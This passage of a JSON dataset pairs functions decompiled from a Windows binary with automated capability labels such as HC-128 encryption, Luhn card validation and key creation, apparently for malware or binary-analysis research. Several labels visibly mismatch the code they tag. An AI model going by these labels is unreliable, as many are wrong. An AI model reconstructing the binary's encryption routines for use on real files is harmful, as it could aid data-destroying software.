= (var_40h >> 0x1c | var_44h * 0x10) ^ (var_44h >> 2 | var_40h * 0x40000000) ^\n                (var_44h >> 7 | var_40h * 0x2000000);\n        var_38h = uVar2 + (var_40h & var_28h ^ var_40h & uVar7 ^ var_28h & uVar7);\n        var_10ch = var_38h < uVar2;\n        var_50h = uVar10 + uVar4;\n        var_110h = var_50h < uVar10;\n        var_54h = var_a4h + iVar3 + var_110h;\n        var_38h = uVar4 + var_38h;\n        var_114h = var_38h < uVar4;\n        var_3ch = iVar3 + ((var_44h >> 0x1c | var_40h * 0x10) ^ (var_40h >> 2 | var_44h * 0x40000000) ^\n                          (var_40h >> 7 | var_44h * 0x2000000)) +\n                          (var_44h & var_2ch ^ var_44h & var_c0h ^ var_2ch & var_c0h) + var_10ch + var_114h;\n        uVar2 = ~var_50h & var_60h ^ var_50h & var_58h;\n        uVar4 = uVar2 + ((var_50h >> 0xe | var_54h * 0x40000) ^ (var_50h >> 0x12 | var_54h * 0x4000) ^\n                        (var_54h >> 9 | var_50h * 0x800000));\n        var_118h = uVar4 < uVar2;\n        uVar4 = *(var_1ch * 8 + 0x4041a4) + uVar4;\n        var_11ch = uVar4 < *(var_1ch * 8 + 0x4041a4);\n        uVar4 = (&var_3dch)[var_1ch * 2] + uVar4;\n        var_120h = uVar4 < (&var_3dch)[var_1ch * 2];\n        uVar4 = uVar9 + uVar4;\n        var_124h = uVar4 < uVar9;\n        iVar3 = var_bch + (&var_3e0h)[var_1ch * 2] +\n                          *(var_1ch * 8 + 0x4041a0) +\n                          (~var_54h & var_64h ^ var_54h & var_5ch) +\n                          ((var_54h >> 0xe | var_50h * 0x40000) ^ (var_54h >> 0x12 | var_50h * 0x4000) ^\n                          (var_50h >> 9 | var_54h * 0x800000)) + var_118h + var_11ch + var_120h + var_124h;\n        uVar2 = (var_38h >> 0x1c | var_3ch * 0x10) ^ (var_3ch >> 2 | var_38h * 0x40000000) ^\n                (var_3ch >> 7 | var_38h * 0x2000000);\n        var_30h = uVar2 + (var_38h & var_40h ^ var_38h & var_28h ^ var_40h & var_28h);\n        var_128h = var_30h < uVar2;\n        var_48h = uVar7 + uVar4;\n        var_12ch = var_48h < uVar7;\n        var_4ch = var_c0h + iVar3 + var_12ch;\n        var_30h = uVar4 + var_30h;\n        var_130h = var_30h < uVar4;\n        var_34h = iVar3 + ((var_3ch >> 0x1c | var_38h * 0x10) ^ (var_38h >> 2 | var_3ch * 0x40000000) ^\n                          (var_38h >> 7 | var_3ch * 0x2000000)) +\n                          (var_3ch & var_44h ^ var_3ch & var_2ch ^ var_44h & var_2ch) + var_128h + var_130h;\n    }\n    arg_8h[1] = var_30h + arg_8h[1];\n    var_134h = arg_8h[1] < var_30h;\n    *arg_8h = var_34h + *arg_8h + var_134h;\n    arg_8h[3] = var_38h + arg_8h[3];\n    var_138h = arg_8h[3] < var_38h;\n    arg_8h[2] = var_3ch + arg_8h[2] + var_138h;\n    arg_8h[5] = var_40h + arg_8h[5];\n    var_13ch = arg_8h[5] < var_40h;\n    arg_8h[4] = var_44h + arg_8h[4] + var_13ch;\n    arg_8h[7] = var_28h + arg_8h[7];\n    var_140h = arg_8h[7] < var_28h;\n    arg_8h[6] = var_2ch + arg_8h[6] + var_140h;\n    arg_8h[9] = var_48h + arg_8h[9];\n    var_144h = arg_8h[9] < var_48h;\n    arg_8h[8] = var_4ch + arg_8h[8] + var_144h;\n    arg_8h[0xb] = var_50h + arg_8h[0xb];\n    var_170h = arg_8h[0xb] < var_50h;\n    arg_8h[10] = var_54h + arg_8h[10] + var_170h;\n    arg_8h[0xd] = var_58h + arg_8h[0xd];\n    var_14ch = arg_8h[0xd] < var_58h;\n    arg_8h[0xc] = var_5ch + arg_8h[0xc] + var_14ch;\n    arg_8h[0xf] = var_60h + arg_8h[0xf];\n    var_150h = arg_8h[0xf] < var_60h;\n    arg_8h[0xe] = var_64h + arg_8h[0xe] + var_150h;\n    return;\n}\n",
        "token_count": 8662
    },
    "00406c50": {
        "rules": [
            "encrypt data using HC-128/f6b71aea27f34766a10ff27131cf0227"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00406c50(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004131e0();\n    fcn.004131b0((iVar1 >> 0x1f) >> 7);\n    return;\n}\n",
        "token_count": 101
    },
    "0040ff70": {
        "rules": [
            "encrypt data using HC-128/f6b71aea27f34766a10ff27131cf0227"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ff70(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t var_4h;\n    \n    for (var_4h = 0; var_4h < *(arg_8h + 0x10c8) >> 5; var_4h = var_4h + 1) {\n        *(arg_8h + 0x10a4 + var_4h * 4) = *(arg_ch + var_4h * 4);\n    }\n    for (; var_4h < 8; var_4h = var_4h + 1) {\n        *(arg_8h + 0x10a4 + var_4h * 4) = *(arg_8h + 0x1094 + var_4h * 4);\n    }\n    for (var_4h = 0; var_4h < 8; var_4h = var_4h + 1) {\n        *(arg_8h + var_4h * 4) = *(arg_8h + 0x1084 + var_4h * 4);\n    }\n    for (var_4h = 8; var_4h < 0x10; var_4h = var_4h + 1) {\n        *(arg_8h + var_4h * 4) = *(arg_8h + 0x1084 + var_4h * 4);\n    }\n    for (var_4h = 0x10; var_4h < 0x110; var_4h = var_4h + 1) {\n        *(arg_8h + var_4h * 4) =\n             ((*(arg_8h + -8 + var_4h * 4) >> 0x11 | *(arg_8h + -8 + var_4h * 4) << 0xf) ^\n              (*(arg_8h + -8 + var_4h * 4) >> 0x13 | *(arg_8h + -8 + var_4h * 4) << 0xd) ^\n             *(arg_8h + -8 + var_4h * 4) >> 10) + *(arg_8h + -0x1c + var_4h * 4) +\n             ((*(arg_8h + -0x3c + var_4h * 4) >> 7 | *(arg_8h + -0x3c + var_4h * 4) << 0x19) ^\n              (*(arg_8h + -0x3c + var_4h * 4) >> 0x12 | *(arg_8h + -0x3c + var_4h * 4) << 0xe) ^\n             *(arg_8h + -0x3c + var_4h * 4) >> 3) + *(arg_8h + -0x40 + var_4h * 4) + var_4h;\n    }\n    for (var_4h = 0; var_4h < 0x10; var_4h = var_4h + 1) {\n        *(arg_8h + var_4h * 4) = *(arg_8h + 0x400 + var_4h * 4);\n    }\n    for (var_4h = 0x10; var_4h < 0x400; var_4h = var_4h + 1) {\n        *(arg_8h + var_4h * 4) =\n             ((*(arg_8h + -8 + var_4h * 4) >> 0x11 | *(arg_8h + -8 + var_4h * 4) << 0xf) ^\n              (*(arg_8h + -8 + var_4h * 4) >> 0x13 | *(arg_8h + -8 + var_4h * 4) << 0xd) ^\n             *(arg_8h + -8 + var_4h * 4) >> 10) + *(arg_8h + -0x1c + var_4h * 4) +\n             ((*(arg_8h + -0x3c + var_4h * 4) >> 7 | *(arg_8h + -0x3c + var_4h * 4) << 0x19) ^\n              (*(arg_8h + -0x3c + var_4h * 4) >> 0x12 | *(arg_8h + -0x3c + var_4h * 4) << 0xe) ^\n             *(arg_8h + -0x3c + var_4h * 4) >> 3) + *(arg_8h + -0x40 + var_4h * 4) + 0x100 + var_4h;\n    }\n    *(arg_8h + 0x1080) = 0;\n    for (var_4h = 0; var_4h < 0x10; var_4h = var_4h + 1) {\n        *(arg_8h + 0x1000 + var_4h * 4) = *(arg_8h + 0x7c0 + var_4h * 4);\n    }\n    for (var_4h = 0; var_4h < 0x10; var_4h = var_4h + 1) {\n        *(arg_8h + 0x1040 + var_4h * 4) = *(arg_8h + 0xfc0 + var_4h * 4);\n    }\n    for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n        fcn.0040da20(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 1342
    },
    "0040fee0": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fee0(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    uint32_t var_4h;\n    \n    *(arg_8h + 0x10c4) = arg_10h;\n    *(arg_8h + 0x10c8) = arg_14h;\n    for (var_4h = 0; var_4h < arg_10h >> 5; var_4h = var_4h + 1) {\n        *(arg_8h + 0x1084 + var_4h * 4) = *(arg_ch + var_4h * 4);\n    }\n    for (; var_4h < 8; var_4h = var_4h + 1) {\n        *(arg_8h + 0x1084 + var_4h * 4) = *(arg_8h + 0x1074 + var_4h * 4);\n    }\n    return;\n}\n",
        "token_count": 237
    },
    "00404c20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404c20(int32_t arg_8h, int32_t arg_ch, uint16_t *arg_10h)\n\n{\n    uint32_t in_EAX;\n    uint16_t *puVar1;\n    uint32_t var_8h;\n    uint16_t *var_4h;\n    \n    var_8h = 1;\n    while( true ) {\n        if (arg_8h <= var_8h) {\n            return in_EAX & 0xffffff00;\n        }\n        var_4h = *(arg_ch + var_8h * 4);\n        puVar1 = *var_4h;\n        if (puVar1 == 0x2d) break;\n        in_EAX = var_8h + 1;\n        var_8h = in_EAX;\n    }\n    while (*var_4h == 0x2d) {\n        puVar1 = var_4h + 1;\n        var_4h = puVar1;\n    }\n    for (; (*arg_10h != 0 && (puVar1 = *var_4h,  *arg_10h == puVar1)); arg_10h = arg_10h + 1) {\n        var_4h = var_4h + 1;\n    }\n    return CONCAT31(puVar1 >> 8, 1);\n}\n",
        "token_count": 305
    },
    "00404cb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00404cb0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int16_t *piVar1;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 1;\n    do {\n        if (arg_8h <= var_4h) {\n            return NULL;\n        }\n        piVar1 = *(arg_ch + var_4h * 4);\n        if (*piVar1 == 0x2d) {\n            var_8h = var_8h + 1;\n        }\n        else if ((var_4h - var_8h) + -1 == arg_10h) {\n            return piVar1;\n        }\n        var_4h = var_4h + 1;\n    } while( true );\n}\n",
        "token_count": 211
    },
    "00404dd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "write file on Windows"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404dd0(uint lpBuffer, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint lpString;\n    uint lpNumberOfBytesWritten;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x4141f4);\n    (*_sym.imp.USER32.dll_wsprintfA)(&lpString, 0x401754, arg_10h);\n    uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpBuffer, &lpNumberOfBytesWritten, 0);\n    (*_sym.imp.KERNEL32.dll_WriteFile)(*0x4141f0, lpBuffer, uVar1);\n    (*_sym.imp.KERNEL32.dll_WriteFile)(*0x4141f0, 0x401758, 0xe, &lpNumberOfBytesWritten, 0);\n    uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&lpString, &lpNumberOfBytesWritten, 0);\n    (*_sym.imp.KERNEL32.dll_WriteFile)(*0x4141f0, &lpString, uVar1);\n    (*_sym.imp.KERNEL32.dll_WriteFile)(*0x4141f0, 0x401768, 4, &lpNumberOfBytesWritten, 0);\n    uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_ch, &lpNumberOfBytesWritten, 0);\n    (*_sym.imp.KERNEL32.dll_WriteFile)(*0x4141f0, arg_ch, uVar1);\n    (*_sym.imp.KERNEL32.dll_WriteFile)(*0x4141f0, 0x401770, 2, &lpNumberOfBytesWritten, 0);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4141f4);\n    return;\n}\n",
        "token_count": 394
    },
    "00406c10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00406c10(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004131e0();\n    fcn.004131b0((iVar1 >> 0x1f) >> 6);\n    return;\n}\n",
        "token_count": 101
    },
    "00406f00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406f00(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_98h;\n    \n    fcn.00405140(&var_98h, arg_ch, arg_10h);\n    fcn.004065d0(&var_98h);\n    fcn.00406c90(&var_98h);\n    fcn.00412eb0(arg_8h, &var_98h, 0x50);\n    return;\n}\n",
        "token_count": 113
    },
    "00407c50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407c50(uint arg_8h, uint arg_ch)\n\n{\n    uint var_98h;\n    \n    fcn.00406f60(&var_98h, arg_ch);\n    fcn.004065d0(&var_98h);\n    fcn.00406c90(&var_98h);\n    fcn.00412eb0(arg_8h, &var_98h, 0x50);\n    return;\n}\n",
        "token_count": 103
    },
    "00408d30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00408d30(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    uint var_4c8h;\n    uint var_430h;\n    uint var_398h;\n    uint var_348h;\n    uint var_2b0h;\n    uint var_218h;\n    uint var_1c8h;\n    uint var_180h;\n    uint var_e8h;\n    uint var_98h;\n    \n    fcn.00412eb0(&var_398h, arg_18h, 0x50);\n    fcn.00405020(arg_18h, arg_1ch);\n    fcn.004050a0(arg_1ch, &var_398h);\n    fcn.00412eb0(&var_e8h, arg_20h, 0x50);\n    fcn.00405020(arg_20h, arg_24h);\n    fcn.004050a0(arg_24h, &var_e8h);\n    fcn.00405140(&var_180h, arg_20h, arg_1ch);\n    fcn.00405140(&var_98h, arg_18h, arg_24h);\n    fcn.004065d0(&var_180h);\n    fcn.00406c90(&var_180h);\n    fcn.004065d0(&var_98h);\n    fcn.00406c90(&var_98h);\n    fcn.00412eb0(&var_e8h, &var_180h, 0x50);\n    fcn.00405020(&var_180h, &var_98h);\n    fcn.004050a0(&var_98h, &var_e8h);\n    fcn.00407c50(&var_4c8h, &var_180h);\n    fcn.00407c50(&var_430h, &var_98h);\n    fcn.00405140(&var_98h, &var_430h, arg_28h);\n    fcn.004065d0(&var_98h);\n    fcn.00406c90(&var_98h);\n    fcn.00412eb0(arg_10h, &var_4c8h, 0x50);\n    fcn.00412eb0(arg_14h, &var_98h, 0x50);\n    fcn.00407c50(&var_348h, arg_18h);\n    fcn.00407c50(&var_2b0h, arg_1ch);\n    fcn.00405140(arg_8h, &var_348h, &var_2b0h);\n    fcn.004065d0(arg_8h);\n    fcn.00406c90(arg_8h);\n    fcn.004050a0(&var_2b0h, &var_348h);\n    fcn.00412e80(&var_1c8h, 0, 0x48);\n    fcn.004050f0(&var_218h, &var_2b0h, 0x1db41, 0);\n    fcn.00406c90(&var_218h);\n    fcn.00405020(&var_218h, &var_348h);\n    fcn.00405140(arg_ch, &var_2b0h, &var_218h);\n    fcn.004065d0(arg_ch);\n    fcn.00406c90(arg_ch);\n    return;\n}\n",
        "token_count": 826
    },
    "00410640": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410640(int32_t arg_8h)\n\n{\n    int32_t var_4h;\n    \n    fcn.00410b90(arg_8h);\n    *(arg_8h + 0xc0) = 0;\n    for (var_4h = 0; var_4h < 4; var_4h = var_4h + 1) {\n        *(arg_8h + 0xc4 + var_4h * 4) = 0;\n    }\n    return;\n}\n",
        "token_count": 121
    },
    "00410b40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_d4h\n\nvoid __cdecl fcn.00410b40(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_d4h;\n    uint in_stack_ffffff2c;\n    uint in_stack_ffffff30;\n    uint in_stack_ffffff34;\n    uint in_stack_ffffff38;\n    uint in_stack_ffffff3c;\n    uint in_stack_ffffff40;\n    uint in_stack_ffffff44;\n    uint in_stack_ffffff48;\n    uint in_stack_ffffff4c;\n    uint in_stack_ffffff50;\n    uint in_stack_ffffff54;\n    uint in_stack_ffffff58;\n    uint in_stack_ffffff5c;\n    uint in_stack_ffffff60;\n    uint in_stack_ffffff64;\n    uint in_stack_ffffff68;\n    uint in_stack_ffffff6c;\n    uint in_stack_ffffff70;\n    uint in_stack_ffffff74;\n    uint in_stack_ffffff78;\n    uint in_stack_ffffff7c;\n    uint in_stack_ffffff80;\n    uint in_stack_ffffff84;\n    uint in_stack_ffffff88;\n    uint in_stack_ffffff8c;\n    uint in_stack_ffffff90;\n    uint in_stack_ffffff94;\n    uint in_stack_ffffff98;\n    \n    fcn.00410640(&var_d4h);\n    fcn.00410690(&var_d4h, arg_8h, arg_ch);\n    fcn.004108d0(&var_d4h, arg_10h, var_d4h, in_stack_ffffff2c, in_stack_ffffff30, in_stack_ffffff34, in_stack_ffffff38\n                 , in_stack_ffffff3c, in_stack_ffffff40, in_stack_ffffff44, in_stack_ffffff48, in_stack_ffffff4c, \n                 in_stack_ffffff50, in_stack_ffffff54, in_stack_ffffff58, in_stack_ffffff5c, in_stack_ffffff60, \n                 in_stack_ffffff64, in_stack_ffffff68, in_stack_ffffff6c, in_stack_ffffff70, in_stack_ffffff74, \n                 in_stack_ffffff78, in_stack_ffffff7c, in_stack_ffffff80, in_stack_ffffff84, in_stack_ffffff88, \n                 in_stack_ffffff8c, in_stack_ffffff90, in_stack_ffffff94, in_stack_ffffff98);\n    return;\n}\n",
        "token_count": 530
    },
    "00410b90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410b90(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t var_4h;\n    \n    for (var_4h = 0; var_4h < 8; var_4h = var_4h + 1) {\n        uVar1 = *(var_4h * 8 + 0x40412c);\n        *(arg_8h + var_4h * 8) = *(var_4h * 8 + 0x404128);\n        *(arg_8h + 4 + var_4h * 8) = uVar1;\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "00412e80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412e80(int32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t var_4h;\n    \n    for (var_4h = 0; var_4h < arg_10h; var_4h = var_4h + 1) {\n        *(arg_8h + var_4h) = arg_ch;\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "00412eb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412eb0(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t var_4h;\n    \n    for (var_4h = 0; var_4h < arg_10h; var_4h = var_4h + 1) {\n        *(arg_8h + var_4h) = *(arg_ch + var_4h);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "00412f40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412f40(uint *lpCriticalSection, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    lpCriticalSection[8] = arg_ch;\n    uVar1 = fcn.00412ef0(arg_ch << 2);\n    lpCriticalSection[9] = uVar1;\n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateSemaphoreA)(0, arg_ch, arg_ch, 0);\n    *lpCriticalSection = uVar1;\n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateSemaphoreA)(0, 0, arg_ch, 0);\n    lpCriticalSection[1] = uVar1;\n    lpCriticalSection[10] = 0;\n    lpCriticalSection[0xb] = 0;\n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(lpCriticalSection + 2);\n    return;\n}\n",
        "token_count": 189
    },
    "00404ec0": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404ec0(uint lpFileName)\n\n{\n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x4141f4);\n    *0x4141f0 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x40000000, 1, 0, 4, 0x80, 0);\n    return;\n}\n",
        "token_count": 88
    },
    "00404b80": {
        "rules": [
            "create new key via CryptAcquireContext"
        ],
        "decompiled_code": "\nuint fcn.00404b80(void)\n\n{\n    int32_t iVar1;\n    uint phProv;\n    \n    phProv = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)(&phProv, 0, 0, 0x18, 0xf0000000);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)(&phProv, 0, 0, 0x18, 0xf0000008);\n        if (iVar1 == 0) {\n            phProv = 0;\n        }\n    }\n    return phProv;\n}\n",
        "token_count": 153
    }
}